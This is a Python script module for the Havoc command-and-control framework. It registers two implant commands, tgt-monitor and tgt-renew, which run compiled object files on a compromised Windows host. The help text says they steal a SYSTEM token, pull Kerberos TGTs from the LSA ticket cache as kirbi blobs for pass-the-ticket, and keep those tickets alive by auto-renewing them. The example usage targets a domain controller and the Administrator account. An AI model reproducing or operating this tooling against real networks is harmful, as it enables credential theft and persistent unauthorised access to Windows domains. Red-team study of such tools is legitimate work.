from havoc import Demon, RegisterCommand, RegisterModule


def _parse_flags(param, flags):
    """Parse space-split tokens into a dict. `flags` maps flag name -> (type, default).
    Supports `--flag value` and `--flag=value`. Returns (values_dict, error_str)."""
    values = {name: spec[1] for name, spec in flags.items()}
    i = 0
    while i < len(param):
        p = param[i]
        matched = None
        for name, (typ, default) in flags.items():
            if p == name or p.startswith(name + "="):
                matched = name
                break
        if matched is None:
            i += 1
            continue

        typ, default = flags[matched]
        if p == matched:
            if i + 1 >= len(param):
                return values, f"flag {matched} requires a value"
            val = param[i + 1]
            i += 2
        else:
            val = p.split("=", 1)[1]
            i += 1

        if typ == int:
            try:
                values[matched] = int(val)
            except ValueError:
                return values, f"invalid integer for {matched}: {val}"
        else:
            values[matched] = val

    return values, None


def tgt_monitor(demonID, *param):
    demon  = Demon(demonID)
    packer = Packer()

    flags = {
        "--interval": (int, 60),
        "--user":     (str, ""),
    }
    values, err = _parse_flags(param, flags)
    if err:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, err)
        return False

    interval = values["--interval"]
    user     = values["--user"]

    if interval <= 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Interval must be > 0")
        return False

    packer.addint(interval)
    packer.addstr(user)

    TaskID = demon.ConsoleWrite(
        demon.CONSOLE_TASK,
        f"Tasked demon to monitor for new Kerberos TGTs (interval {interval}s)"
    )

    demon.InlineExecute(TaskID, "go", f"bin/tgt-monitor.{demon.ProcessArch}.o", packer.getbuffer(), True)
    return TaskID


def tgt_renew(demonID, *param):
    demon  = Demon(demonID)
    packer = Packer()

    flags = {
        "--interval":  (int, 60),
        "--threshold": (int, 15),
        "--user":      (str, ""),
        "--luid":      (str, ""),
    }
    values, err = _parse_flags(param, flags)
    if err:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, err)
        return False

    interval  = values["--interval"]
    threshold = values["--threshold"]
    user      = values["--user"]
    luid      = values["--luid"]

    if interval <= 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Interval must be > 0")
        return False
    if threshold <= 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Threshold must be > 0")
        return False
    if user and luid:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Flags --user and --luid are mutually exclusive")
        return False

    packer.addint(interval)
    packer.addint(threshold)
    packer.addstr(user)
    packer.addstr(luid)

    TaskID = demon.ConsoleWrite(
        demon.CONSOLE_TASK,
        f"Tasked demon to auto-renew Kerberos TGTs (interval {interval}s, threshold {threshold}min)"
    )

    demon.InlineExecute(TaskID, "go", f"bin/tgt-renew.{demon.ProcessArch}.o", packer.getbuffer(), True)
    return TaskID


TGT_MONITOR_HELP = (
    "Monitor the LSA ticket cache for new Kerberos TGTs and extract them\n"
    "as base64 kirbi blobs (for pass-the-ticket) the moment they appear.\n"
    "Runs asynchronously until killed with 'job kill <id>'.\n"
    "\n"
    "Requires NT AUTHORITY\\SYSTEM (steals a SYSTEM token if available).\n"
    "\n"
    "USAGE:\n"
    "  tgt-monitor [--interval <seconds>] [--user <user1,user2,...>]\n"
    "\n"
    "OPTIONS:\n"
    "  --interval <n>   Polling interval in seconds (default: 60).\n"
    "  --user <list>    Comma-separated target usernames (default: all).\n"
    "                   Computer accounts must end with '$'.\n"
    "\n"
    "EXAMPLES:\n"
    "  tgt-monitor\n"
    "  tgt-monitor --interval 5 --user DC01$,Administrator\n"
)

TGT_RENEW_HELP = (
    "Automatically renew Kerberos TGTs whose remaining lifetime is below a\n"
    "threshold, re-importing the renewed ticket into the logon session.\n"
    "Runs asynchronously until killed with 'job kill <id>'.\n"
    "\n"
    "Requires NT AUTHORITY\\SYSTEM (steals a SYSTEM token if available).\n"
    "\n"
    "USAGE:\n"
    "  tgt-renew [--interval <seconds>] [--threshold <minutes>]\n"
    "            [--user <user1,user2,...>] [--luid <luid1,luid2,...>]\n"
    "\n"
    "OPTIONS:\n"
    "  --interval <n>   Polling interval in seconds (default: 60).\n"
    "  --threshold <n>  Renew when time-to-expiry < n minutes (default: 15).\n"
    "  --user <list>    Comma-separated target usernames (default: all).\n"
    "  --luid <list>    Comma-separated target LUIDs (default: all).\n"
    "                   --user and --luid are mutually exclusive.\n"
    "\n"
    "EXAMPLES:\n"
    "  tgt-renew\n"
    "  tgt-renew --interval 300 --threshold 30\n"
    "  tgt-renew --luid 0x3e4 --interval 300 --threshold 30\n"
)

RegisterCommand(tgt_monitor, "", "tgt-monitor",
                "Monitor the LSA ticket cache and extract new TGTs as kirbi blobs", 0,
                TGT_MONITOR_HELP, "--interval 5 --user DC01$")
RegisterCommand(tgt_renew, "", "tgt-renew",
                "Auto-renew TGTs nearing expiry and re-import them into the logon session", 0,
                TGT_RENEW_HELP, "--interval 300 --threshold 30")
